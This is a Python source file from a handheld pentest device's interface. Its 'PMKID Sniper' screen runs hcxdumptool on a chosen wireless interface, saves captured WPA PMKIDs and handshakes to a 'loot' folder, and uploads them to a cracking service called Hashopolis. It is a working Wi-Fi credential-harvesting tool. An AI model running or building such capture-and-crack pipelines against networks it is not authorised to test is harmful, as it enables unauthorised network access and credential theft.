"""PMKID Sniper tool — uses hcxdumptool for silent credential harvesting.

This tool captures PMKIDs and handshakes without necessarily deauthing,
by requesting them directly from the AP. It is the modern gold standard
for WiFi pentesting.
"""
from __future__ import annotations

import os
import signal
import subprocess
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

import pygame

from bigbox import theme, hardware, hashopolis
from bigbox.events import Button, ButtonEvent
from bigbox.ui.section import SectionContext
from bigbox.ui.wifi_attack import _list_wlan_ifaces

PHASE_PICK_IFACE = "iface"
PHASE_SNIPING = "sniping"
PHASE_RESULT = "result"

class PMKIDSniperView:
    def __init__(self) -> None:
        self.dismissed = False
        self.phase = PHASE_PICK_IFACE
        self.status_msg = "Select Interface"
        
        self.ifaces = _list_wlan_ifaces()
        self.iface_idx = 0
        self.mon_iface: str | None = None
        
        self._proc: subprocess.Popen | None = None
        self._stop = False
        
        self.pcapng_path: Path | None = None
        self.captured_count = 0
        self.start_time = 0.0
        
        self.LOOT_DIR = Path("loot/handshakes")

    def handle(self, ev: ButtonEvent, ctx: SectionContext) -> None:
        if not ev.pressed: return

        if self.phase == PHASE_PICK_IFACE:
            if ev.button is Button.UP:
                self.iface_idx = (self.iface_idx - 1) % len(self.ifaces)
            elif ev.button is Button.DOWN:
                self.iface_idx = (self.iface_idx + 1) % len(self.ifaces)
            elif ev.button is Button.A:
                if self.ifaces:
                    self.mon_iface = self.ifaces[self.iface_idx].name
                    self._start_snipe()
            elif ev.button is Button.B:
                self.dismissed = True

        elif self.phase == PHASE_SNIPING:
            if ev.button is Button.A: # Stop
                self._stop_snipe()
            elif ev.button is Button.X: # Upload to Hashopolis
                if self.pcapng_path and self.pcapng_path.exists():
                    self.status_msg = "UPLOADING TO HASHOPOLIS..."
                    success = hashopolis.upload_hash(self.pcapng_path)
                    self.status_msg = "UPLOAD SUCCESS" if success else "UPLOAD FAILED"
            elif ev.button is Button.B:
                self._stop_snipe()
                self.dismissed = True

        elif self.phase == PHASE_RESULT:
            if ev.button in (Button.A, Button.B):
                self.phase = PHASE_PICK_IFACE

    def _start_snipe(self) -> None:
        self.LOOT_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.pcapng_path = self.LOOT_DIR / f"sniper_{ts}.pcapng"
        
        # hcxdumptool command
        # -i interface, -o output pcapng, --enable_status=1 for console output
        cmd = [
            "hcxdumptool",
            "-i", self.mon_iface,
            "-o", str(self.pcapng_path),
            "--enable_status=1"
        ]
        
        self.phase = PHASE_SNIPING
        self.status_msg = "SNIPING PMKIDs..."
        self.start_time = time.time()
        self.captured_count = 0
        self._stop = False
        
        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid
            )
            threading.Thread(target=self._read_output, daemon=True).start()
        except Exception as e:
            self.status_msg = f"ERR: {str(e)}"
            self.phase = PHASE_RESULT

    def _read_output(self) -> None:
        if not self._proc or not self._proc.stdout: return
        for line in self._proc.stdout:
            if self._stop: break
            # Parse hcxdumptool output for status
            # It usually reports counts of PMKIDs/EAPOLs
            if "PMKID" in line or "EAPOL" in line:
                # Basic heuristic to show activity
                self.captured_count += 1
        
    def _stop_snipe(self) -> None:
        self._stop = True
        if self._proc:
            try:
                os.killpg(os.getpgid(self._proc.pid), signal.SIGINT)
                self._proc.wait(timeout=2)
            except:
                if self._proc: self._proc.kill()
        self._proc = None
        self.phase = PHASE_RESULT

    def update(self) -> None:
        pass

    def draw(self, surf: pygame.Surface, ctx: SectionContext) -> None:
        f = ctx.fonts["base"]
        f_bold = ctx.fonts["bold"]
        f_small = ctx.fonts["small"]
        
        head_h, foot_h = 40, 30
        body_h = surf.get_height() - head_h - foot_h
        
        # Header
        pygame.draw.rect(surf, theme.FG, (0, 0, surf.get_width(), head_h))
        title = f_bold.render("PMKID SNIPER", True, theme.BG)
        surf.blit(title, (10, (head_h - title.get_height()) // 2))
        
        # Status Bar
        stat_surf = f_small.render(self.status_msg, True, theme.FG)
        surf.blit(stat_surf, (surf.get_width() - stat_surf.get_width() - 10, (head_h - stat_surf.get_height()) // 2))

        if self.phase == PHASE_PICK_IFACE:
            for i, iface in enumerate(self.ifaces):
                color = theme.FG if i == self.iface_idx else theme.FG_DIM
                txt = f"{'> ' if i == self.iface_idx else '  '}{iface.name} {'(mon)' if iface.is_monitor else ''}"
                surf.blit(f.render(txt, True, color), (20, head_h + 20 + i*30))
        
        elif self.phase == PHASE_SNIPING:
            elapsed = int(time.time() - self.start_time)
            surf.blit(f.render(f"Interface: {self.mon_iface}", True, theme.FG), (20, head_h + 20))
            surf.blit(f.render(f"Time: {elapsed}s", True, theme.FG), (20, head_h + 50))
            surf.blit(f_bold.render(f"Captured: {self.captured_count} events", True, theme.ERR if self.captured_count > 0 else theme.FG), (20, head_h + 80))
            
            surf.blit(f_small.render("A: Stop  X: Hashopolis Upload", True, theme.FG_DIM), (20, surf.get_height() - foot_h - 20))

        elif self.phase == PHASE_RESULT:
            surf.blit(f.render("SNIPING COMPLETE", True, theme.FG), (20, head_h + 20))
            if self.pcapng_path:
                surf.blit(f_small.render(f"Saved: {self.pcapng_path.name}", True, theme.FG_DIM), (20, head_h + 50))
            surf.blit(f.render("A: Back", True, theme.FG), (20, head_h + 100))
